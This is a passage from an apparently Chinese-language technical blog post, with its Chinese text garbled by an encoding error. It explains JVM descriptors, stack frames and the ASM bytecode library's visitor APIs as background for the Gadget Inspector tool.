S</span><br><span class="line">    Z</span><br><span class="line">   </span><br><span class="line">ObjectType:</span><br><span class="line">    L ClassName ;</span><br><span class="line"></span><br><span class="line">ArrayType:</span><br><span class="line">    [ ComponentType</span><br><span class="line"></span><br><span class="line">ComponentType:</span><br><span class="line">    FieldType</span><br></pre></td></tr></table></figure><p> è¯´æ˜</p><table><thead><tr><th>BaseType Character</th><th>Type</th><th>Interpretation</th></tr></thead><tbody><tr><td>B</td><td>byte</td><td>signed byte</td></tr><tr><td>C</td><td>char</td><td>Unicode character code point in the Basic Multilingual Plane,     encoded with UTF-16</td></tr><tr><td>D</td><td>double</td><td>double-precision floating-point value</td></tr><tr><td>F</td><td>float</td><td>single-precision floating-point value</td></tr><tr><td>I</td><td>int</td><td>integer</td></tr><tr><td>J</td><td>long</td><td>long integer</td></tr><tr><td>L</td><td>ClassName</td><td>;referencean instance of class ClassName</td></tr><tr><td>S</td><td>short</td><td>signed short</td></tr><tr><td>Z</td><td>boolean</td><td>true or false</td></tr><tr><td>[</td><td>reference</td><td>one array dimension</td></tr></tbody></table></li><li><p>æ–¹æ³•ï¼ˆMethodï¼‰æè¿°ç¬¦</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">MethodDescriptor:</span><br><span class="line">    ( ParameterDescriptor* ) ReturnDescriptor</span><br><span class="line"></span><br><span class="line">ParameterDescriptor:</span><br><span class="line">    FieldType</span><br><span class="line"></span><br><span class="line">ReturnDescriptor:</span><br><span class="line">    FieldType</span><br><span class="line">    VoidDescriptor</span><br><span class="line"></span><br><span class="line">VoidDescriptor:</span><br><span class="line">    V</span><br></pre></td></tr></table></figure></li></ol><h2 id="1-2-JVM"><a href="#1-2-JVM" class="headerlink" title="1.2 JVM"></a>1.2 JVM</h2><p>Gadget Inspector çš„ <code>TaintTrackingMethodVisitor</code> ä¸­æ¨¡æ‹Ÿäº† JVM çš„æœ¬åœ°å˜é‡è¡¨ï¼ˆLocal Variable Tableï¼‰å’Œæ“ä½œæ•°æ ˆï¼ˆOperand Stackï¼‰ï¼Œç”¨äºè¿›è¡Œæ±¡ç‚¹åˆ†æã€‚</p><p><strong>æ ˆå¸§ï¼ˆStack Frameï¼‰</strong> æ˜¯ç”¨äºæ”¯æŒè™šæ‹Ÿæœºè¿›è¡Œæ–¹æ³•è°ƒç”¨å’Œæ–¹æ³•æ‰§è¡Œçš„æ•°æ®ç»“æ„ï¼Œæ¯ä¸ªæ–¹æ³•ä»è°ƒç”¨åˆ°æ‰§è¡Œå®Œæˆçš„è¿‡ç¨‹ï¼Œéƒ½å¯¹åº”ç€ä¸€ä¸ªæ ˆå¸§åœ¨è™šæ‹Ÿæœºæ ˆé‡Œä»å…¥æ ˆåˆ°å‡ºæ ˆçš„è¿‡ç¨‹ã€‚</p><p><strong>æœ¬åœ°å˜é‡è¡¨ï¼ˆLocal Variable Tableï¼‰</strong> å­˜å‚¨äº†æ–¹æ³•å‚æ•°å’Œæ–¹æ³•å†…å®šä¹‰çš„å±€éƒ¨å˜é‡ï¼Œéšå¼ä¼ å…¥å®ä¾‹å¯¹è±¡æœ¬èº« <code>this</code> ã€‚</p><p><strong>æ“ä½œæ•°æ ˆï¼ˆOperand Stackï¼‰</strong> ç”±æ“ä½œç æ§åˆ¶å…ƒç´ çš„å‡º&#x2F;å…¥æ ˆï¼Œæ“ä½œæ•°æ ˆä¸­çš„å…ƒç´ å¯ä»¥æ˜¯ä»»æ„ Java æ•°æ®ç±»å‹ã€‚</p><ul><li>å…¥æ ˆï¼šæœ¬åœ°å˜é‡è¡¨æˆ–å¯¹è±¡å®ä¾‹çš„å­—æ®µä¸­çš„å…ƒç´ ï¼ˆå¸¸é‡&#x2F;å˜é‡ï¼‰</li><li>å‡ºæ ˆï¼šå°†æ ˆä¸­å…ƒç´ å†™å…¥æœ¬åœ°å˜é‡è¡¨æˆ–è¿”å›ç»™æ–¹æ³•è°ƒç”¨è€…ï¼ˆè¿”å›æ ˆé¡¶ï¼‰</li><li>æ ˆä¸­å…ƒç´ çš„é•¿åº¦å¯èƒ½ä¸º 0ã€1ã€2ï¼Œè¿™é‡Œä¸€ä¸ªå•ä½ä¸º 32 ä½</li></ul><h2 id="1-3-ASM"><a href="#1-3-ASM" class="headerlink" title="1.3 ASM"></a>1.3 ASM</h2><h3 id="è®¿é—®è€…æ¨¡å¼"><a href="#è®¿é—®è€…æ¨¡å¼" class="headerlink" title="è®¿é—®è€…æ¨¡å¼"></a>è®¿é—®è€…æ¨¡å¼</h3><p>è®¿é—®è€…æ¨¡å¼çš„æ ¸å¿ƒæ€æƒ³æ˜¯ä¸ºäº†è®¿é—®æ¯”è¾ƒå¤æ‚çš„æ•°æ®ç»“æ„ï¼Œä¸å»æ”¹å˜æ•°æ®ç»“æ„ï¼Œè€Œæ˜¯æŠŠå¯¹æ•°æ®çš„æ“ä½œæŠ½è±¡å‡ºæ¥ï¼Œ<strong>åœ¨â€œè®¿é—®â€çš„è¿‡ç¨‹ä¸­ä»¥å›è°ƒå½¢å¼åœ¨è®¿é—®è€…ä¸­å¤„ç†æ“ä½œé€»è¾‘</strong>ã€‚å¦‚æœè¦æ–°å¢ä¸€ç»„æ“ä½œï¼Œé‚£ä¹ˆåªéœ€è¦å¢åŠ ä¸€ä¸ªæ–°çš„è®¿é—®è€…ã€‚</p><h3 id="ä»£ç ç»„ç»‡æ¶æ„"><a href="#ä»£ç ç»„ç»‡æ¶æ„" class="headerlink" title="ä»£ç ç»„ç»‡æ¶æ„"></a>ä»£ç ç»„ç»‡æ¶æ„</h3><img src="https://i.loli.net/2021/10/14/KQyh94RWalubxLd.png" width="90%"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">org.objectweb.asm<span class="comment"># Core APIï¼Œæ ¸å¿ƒåŒ…</span></span><br><span class="line">org.objectweb.asm.commons<span class="comment"># åŸºäº core å’Œ tree çš„ç±»é€‚é…å™¨</span></span><br><span class="line">org.objectweb.asm.signature<span class="comment"># æ³›å‹å®šä¹‰çš„ç›¸å…³æ“ä½œ APIï¼Œæ ¸å¿ƒåŒ…çš„æ‰©å……</span></span><br><span class="line">org.objectweb.asm.tree<span class="comment"># Tree APIï¼Œå®ç°å¤æ‚çš„ç±»è½¬æ¢</span></span><br><span class="line">org.objectweb.asm.tree.analysis        <span class="comment"># åŸºäº tree åŒ…æä¾›çš„é™æ€å­—èŠ‚ç åˆ†ææ¡†æ¶</span></span><br><span class="line">org.objectweb.asm.util<span class="comment"># ç”¨äºè°ƒè¯•çš„ç±»è®¿é—®å™¨å’Œé€‚é…å™¨</span></span><br><span class="line">org.objectweb.asm.xml<span class="comment"># å¼ƒç”¨</span></span><br></pre></td></tr></table></figure><h3 id="å·¥ä½œæµç¨‹"><a href="#å·¥ä½œæµç¨‹" class="headerlink" title="å·¥ä½œæµç¨‹"></a>å·¥ä½œæµç¨‹</h3><ol><li><p><code>ClassReader</code> ç±»è§£æ class æ–‡ä»¶ï¼ˆäº‹ä»¶ç”Ÿæˆï¼‰</p><ul><li>è°ƒç”¨ä½œä¸ºå‚æ•°ä¼ é€’ç»™ accept æ–¹æ³•çš„ <code>ClassVisitor</code> å®ä¾‹ä¸Šç›¸åº”çš„ visitXxx æ–¹æ³•</li></ul></li><li><p><code>ClassVisitor</code> ç±»å°†æ‰€æœ‰æ–¹æ³•è°ƒç”¨å§”æ´¾ç»™å¦ä¸€ä¸ª <code>ClassVisitor</code> å®ä¾‹ï¼ˆäº‹ä»¶è¿‡æ»¤ï¼‰</p></li><li><p><code>ClassWriter</code> ç±»æ˜¯ <code>ClassVisitor</code> æŠ½è±¡ç±»çš„å­ç±»ï¼ˆäº‹ä»¶æ¶ˆè´¹ï¼‰</p></li></ol><p>ä¸ºäº†å¯¹ç±»æ–‡ä»¶è¿›è¡Œâ€œè§‚å¯Ÿâ€ï¼Œéœ€è¦ç»§æ‰¿å’Œé‡å†™è®¿é—®è€…ï¼ˆVisitorï¼‰ï¼Œç„¶åè°ƒç”¨ ClassReader.accept æ–¹æ³•æ‰§è¡Œè®¿é—®ï¼Œè¯¥æ–¹æ³•å°†æŒ‰é¡ºåºè°ƒç”¨å‚æ•° ClassVisitor ä¸­çš„æ–¹æ³•ï¼Œæ²¡æœ‰é‡å†™çš„åˆ™è°ƒç”¨çˆ¶ç±» ClassVisitor é»˜è®¤çš„æ–¹æ³•ï¼›è§‚å¯Ÿåˆ°æ–¹æ³•æ—¶ï¼Œå°†æŒ‰é¡ºåºè°ƒç”¨ MethodVisitor ä¸­çš„æ–¹æ³•ï¼Œæ²¡æœ‰é‡å†™çš„ä¹Ÿè°ƒç”¨é»˜è®¤æ–¹æ³•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * æ„é€ å‡½æ•°</span></span><br><span class="line"><span class="comment"> * æ„é€ ä¸€ä¸ªæ–°çš„ ClassReader å¯¹è±¡</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> classFile è¦è¯»å–çš„ JVMS ClassFile ç»“æ„</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> ClassReaderâ€‹(<span class="type">byte</span>[] classFile)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ç”¨ç»™å®šçš„è®¿é—®è€…è®¿é—®ä¼ é€’ç»™æ­¤ ClassReader çš„æ„é€ å‡½æ•°çš„ JVMS ClassFile ç»“æ„</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> classVisitor    è®¿é—®è€…</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> parsingOptions  ç”¨äºè§£ææ­¤ç±»çš„é€‰é¡¹ï¼ˆSKIP_CODE, SKIP_DEBUG, SKIP_FRAMES, EXPAND_FRAMESï¼‰</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> acceptâ€‹(ClassVisitor classVisitor, <span class="type">int</span> parsingOptions)</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/10/14/rAEhSn8x3DMLwtO.jpg"><h3 id="è®¿é—®è€…"><a href="#è®¿é—®è€…" class="headerlink" title="è®¿é—®è€…"></a>è®¿é—®è€…</h3><h4 id="1-ClassVisitor"><a href="#1-ClassVisitor" class="headerlink" title="1. ClassVisitor"></a>1. ClassVisitor</h4><p>æ–¹æ³•è°ƒç”¨é¡ºåºï¼ˆè®¿é—®é¡ºåºï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">visit [ visitSource ] [ visitModule ][ visitNestHost ][ visitOuterClass ] ( visitAnnotation | visitTypeAnnotation | visitAttribute )* ( visitNestMember | [ * visitPermittedSubclass ] | visitInnerClass | visitRecordComponent | visitField | visitMethod )* visitEnd</span><br></pre></td></tr></table></figure><p>Gadget Inspector ä¸­æ¶‰åŠçš„æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * æ„é€ å‡½æ•°</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>api     è®¿é—®è€…å®ç°çš„ ASM API ç‰ˆæœ¬ã€‚å¿…é¡»æ˜¯ Opcodes.ASM4ã€Opcodes.ASM5ã€Opcodes.ASM6ã€Opcodes.ASM7 ä¹‹ä¸€ã€‚</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> ClassVisitorâ€‹(<span class="type">int</span> api)</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è®¿é—®ç±»çš„å¤´éƒ¨</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>versionç±»ç‰ˆæœ¬</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>accessç±»çš„è®¿é—®æ ‡å¿—ï¼ˆOpcodesï¼‰</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>nameç±»çš„å†…éƒ¨åç§°ï¼ˆå®Œå…¨é™å®šåï¼‰</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>signatureç±»çš„ç­¾å</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>superNameçˆ¶ç±»çš„å†…éƒ¨åç§°</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>interfacesç±»æ¥å£çš„å†…éƒ¨åç§°</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visit</span><span class="params">(<span class="type">int</span> version, <span class="type">int</span> access, java.lang.String name, java.lang.String signature, java.lang.String superName, java.lang.String[] interfaces)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è®¿é—®ç±»çš„å¤–å›´ç±»ï¼Œå½“ç±»å…·æœ‰å¤–å›´ç±»æ—¶è‡ªåŠ¨è°ƒç”¨æ­¤æ–¹æ³•</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>ownerç±»çš„å¤–å›´ç±»çš„å†…éƒ¨åç§°</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>nameåŒ…å«ç±»çš„æ–¹æ³•çš„åç§°ï¼Œå¦‚æœç±»æ²¡æœ‰åŒ…å«åœ¨å…¶å¤–å›´ç±»çš„æ–¹æ³•ä¸­ï¼Œåˆ™ä¸ºç©º</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>descriptoråŒ…å«ç±»çš„æ–¹æ³•çš„æè¿°ç¬¦ï¼Œå¦‚æœç±»æ²¡æœ‰åŒ…å«åœ¨å…¶å¤–å›´ç±»çš„æ–¹æ³•ä¸­ï¼Œåˆ™ä¸ºç©º</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitOuterClass</span><span class="params">(java.lang.String owner, java.lang.String name, java.lang.String descriptor)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è®¿é—®å†…éƒ¨ç±»ï¼Œè¿™ä¸ªå†…éƒ¨ç±»ä¸ä¸€å®šæ˜¯è¢«è®¿é—®çš„ç±»çš„æˆå‘˜</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>ownerå†…éƒ¨ç±»çš„å†…éƒ¨åç§°</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>outerNameå†…éƒ¨ç±»æ‰€å±çš„ç±»çš„å†…éƒ¨åç§°ï¼Œå¯¹äºéæˆå‘˜ç±»å¯èƒ½ä¸ºç©º</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>innerNameå†…éƒ¨ç±»åœ¨å…¶å¤–å›´ç±»ä¸­çš„(ç®€å•)åç§°ï¼Œå¯¹äºåŒ¿åå†…éƒ¨ç±»å¯èƒ½ä¸ºç©º</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>accesså†…éƒ¨ç±»æœ€åˆåœ¨å¤–å›´ç±»ä¸­å£°æ˜çš„è®¿é—®æ ‡å¿—</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitInnerClass</span><span class="params">(java.lang.String name, java.lang.String outerName, java.lang.String innerName, <span class="type">int</span> access)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è®¿é—®ç±»çš„å­—æ®µ</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>accesså­—æ®µçš„è®¿é—®æ ‡å¿—</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>name    å­—æ®µçš„åç§°</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>descriptorå­—æ®µçš„æè¿°ç¬¦</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>signatureå­—æ®µçš„ç­¾å</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>value       å­—æ®µçš„åˆå§‹å€¼ï¼Œä»…é’ˆå¯¹é™æ€å­—æ®µ</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> FieldVisitor visitFieldâ€‹(<span class="type">int</span> access, java.lang.String name, java.lang.String descriptor, java.lang.String signature, java.lang.Object value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è®¿é—®ç±»çš„ä¸€ä¸ªæ–¹æ³•ï¼ˆæ–¹æ³•å®šä¹‰ï¼‰</span></span><br><span class="line"><span class="comment"> * è¿™ä¸ªæ–¹æ³•åœ¨æ¯æ¬¡è°ƒç”¨æ—¶å¿…é¡»è¿”å›ä¸€ä¸ªæ–°çš„ MethodVisitor å®ä¾‹ï¼ˆæˆ–nullï¼‰</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>accessæ–¹æ³•çš„è®¿é—®æ ‡å¿—ï¼ˆOpcodesï¼‰</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>nameæ–¹æ³•çš„åç§°</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>descriptoræ–¹æ³•çš„æè¿°ç¬¦</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>signatureæ–¹æ³•çš„ç­¾åï¼Œå¦‚æœæ–¹æ³•å‚æ•°ã€è¿”å›ç±»å‹å’Œå¼‚å¸¸ä¸ä½¿ç”¨æ³›å‹ç±»å‹ï¼Œåˆ™å¯èƒ½ä¸ºç©º</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>exceptionsæ–¹æ³•å¼‚å¸¸ç±»çš„å†…éƒ¨åç§°ï¼Œå¯èƒ½ä¸ºç©º</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> MethodVisitor <span class="title function_">visitMethod</span><span class="params">(<span class="type">int</span> access, java.lang.String name, java.lang.String descriptor, java.lang.String signature, java.lang.String[] exceptions)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è¯¥æ–¹æ³•æ˜¯æœ€åä¸€ä¸ªè¢«è°ƒç”¨çš„æ–¹æ³•ï¼Œç”¨äºé€šçŸ¥è®¿é—®è€…è¯¥ç±»çš„æ‰€æœ‰å­—æ®µå’Œæ–¹æ³•å·²è¢«è®¿é—®</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitEnd</span><span class="params">()</span></span><br></pre></td></tr></table></figure><h4 id="2-MethodVisitor"><a href="#2-MethodVisitor" class="headerlink" title="2. MethodVisitor"></a>2. MethodVisitor</h4><p>æ–¹æ³•è°ƒç”¨é¡ºåºï¼ˆè®¿é—®é¡ºåºï¼‰ï¼Œ<code>visit&lt;i&gt;X&lt;/i&gt;Insn</code> æŒ‰ç…§å­—èŠ‚ç æŒ‡ä»¤é¡ºåºè°ƒç”¨ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">( visitParameter )* [ visitAnnotationDefault ] ( visitAnnotation | visitAnnotableParameterCount | visitParameterAnnotation visitTypeAnnotation | visitAttribute )* [ visitCode ( visitFrame | visit&lt;i&gt;X&lt;/i&gt;Insn | visitLabel | visitInsnAnnotation | visitTryCatchBlock | visitTryCatchAnnotation | visitLocalVariable | visitLocalVariableAnnotation | visitLineNumber )* visitMaxs ] visitEnd</span><br><span class="line"></span><br><span class="line">In addition, the visit&lt;i&gt;X&lt;/i&gt;Insn and visitLabel methods must be called in the sequential order of the bytecode instructions of the visited code.</span><br></pre></td></tr></table></figure><p>Gadget Inspector ä¸­æ¶‰åŠçš„æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * å¯åŠ¨å¯¹æ–¹æ³•ä»£ç çš„è®¿é—®ï¼Œå¦‚æœæœ‰çš„è¯ï¼ˆå³éæŠ½è±¡æ–¹æ³•ï¼‰</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitCode</span><span class="params">()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è®¿é—®å±€éƒ¨å˜é‡å’Œæ“ä½œæ•°å †æ ˆå…ƒç´ çš„å½“å‰çŠ¶æ€</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>typeå †æ ˆæ˜ å°„å¸§çš„ç±»å‹ï¼ˆstack map frameï¼‰</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>numLocalè¢«è®¿é—®å¸§ä¸­çš„å±€éƒ¨å˜é‡æ•°é‡</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>localè¢«è®¿é—®å¸§ä¸­çš„å±€éƒ¨å˜é‡ç±»å‹</span></span><br><span 